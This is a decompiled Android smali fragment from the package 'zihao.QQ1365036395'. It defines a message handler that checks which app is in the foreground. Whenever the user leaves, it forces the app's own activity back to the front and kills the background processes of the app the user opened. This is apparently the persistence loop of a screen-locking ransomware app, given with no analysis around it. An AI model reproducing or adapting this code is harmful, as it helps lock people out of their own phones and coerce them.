.class Lzihao/QQ1365036395/c$100000000;
.super Ljava/lang/Object;
.source "c.java"

# interfaces
.implements Landroid/os/Handler$Callback;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lzihao/QQ1365036395/c;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000000"
.end annotation


# instance fields
.field private final this$0:Lzihao/QQ1365036395/c;


# direct methods
.method constructor <init>(Lzihao/QQ1365036395/c;)V
    .locals 5

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    invoke-direct {v3}, Ljava/lang/Object;-><init>()V

    move-object v3, v0

    move-object v4, v1

    iput-object v4, v3, Lzihao/QQ1365036395/c$100000000;->this$0:Lzihao/QQ1365036395/c;

    return-void
.end method

.method static access$0(Lzihao/QQ1365036395/c$100000000;)Lzihao/QQ1365036395/c;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/c$100000000;->this$0:Lzihao/QQ1365036395/c;

    move-object v0, v3

    return-object v0
.end method


# virtual methods
.method public handleMessage(Landroid/os/Message;)Z
    .locals 17

    .prologue
    .line 29
    move-object/from16 v0, p0

    move-object/from16 v1, p1

    move-object v10, v0

    iget-object v10, v10, Lzihao/QQ1365036395/c$100000000;->this$0:Lzihao/QQ1365036395/c;

    iget-object v10, v10, Lzihao/QQ1365036395/c;->context:Landroid/content/Context;

    const-string v11, "activity"

    invoke-virtual {v10, v11}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Landroid/app/ActivityManager;

    move-object v2, v10

    .line 30
    move-object v10, v2

    const/4 v11, 0x1

    invoke-virtual {v10, v11}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v10

    move-object v3, v10

    .line 31
    move-object v10, v3

    const/4 v11, 0x0

    invoke-interface {v10, v11}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Landroid/app/ActivityManager$RunningTaskInfo;

    move-object v4, v10

    .line 32
    move-object v10, v4

    iget-object v10, v10, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    move-object v5, v10

    .line 33
    move-object v10, v5

    invoke-virtual {v10}, Landroid/content/ComponentName;->getPackageName()Ljava/lang/String;

    move-result-object v10

    move-object v6, v10

    .line 35
    move-object v10, v6

    const-string v11, "zihao.QQ1365036395"

    invoke-virtual {v10, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_0

    .line 46
    :goto_0
    const/4 v10, 0x0

    move v0, v10

    return v0

    .line 39
    :cond_0
    new-instance v10, Landroid/content/Intent;

    move-object/from16 v16, v10

    move-object/from16 v10, v16

    move-object/from16 v11, v16

    invoke-direct {v11}, Landroid/content/Intent;-><init>()V

    move-object v7, v10

    .line 40
    move-object v10, v7

    move-object v11, v0

    iget-object v11, v11, Lzihao/QQ1365036395/c$100000000;->this$0:Lzihao/QQ1365036395/c;

    iget-object v11, v11, Lzihao/QQ1365036395/c;->context:Landroid/content/Context;

    :try_start_0
    const-string v12, "zihao.QQ1365036395.a"

    invoke-static {v12}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v12

    invoke-virtual {v10, v11, v12}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    move-result-object v10

    .line 41
    move-object v10, v7

    const/high16 v11, 0x4000000

    invoke-virtual {v10, v11}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    move-result-object v10

    .line 42
    move-object v10, v7

    const/high16 v11, 0x10000000

    invoke-virtual {v10, v11}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v10

    .line 43
    move-object v10, v0

    iget-object v10, v10, Lzihao/QQ1365036395/c$100000000;->this$0:Lzihao/QQ1365036395/c;

    move-object v11, v7

    invoke-virtual {v10, v11}, Lzihao/QQ1365036395/c;->startActivity(Landroid/content/Intent;)V

    .line 44
    move-object v10, v2

    move-object v11, v6

    invoke-virtual {v10, v11}, Landroid/app/ActivityManager;->killBackgroundProcesses(Ljava/lang/String;)V

    goto :goto_0

    .line 40
    :catch_0
    move-exception v10

    move-object v8, v10

    new-instance v10, Ljava/lang/NoClassDefFoundError;

    move-object/from16 v16, v10

    move-object/from16 v10, v16

    move-object/from16 v11, v16

    move-object v12, v8

    invoke-virtual {v12}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v12

    invoke-direct {v11, v12}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v10
.end method
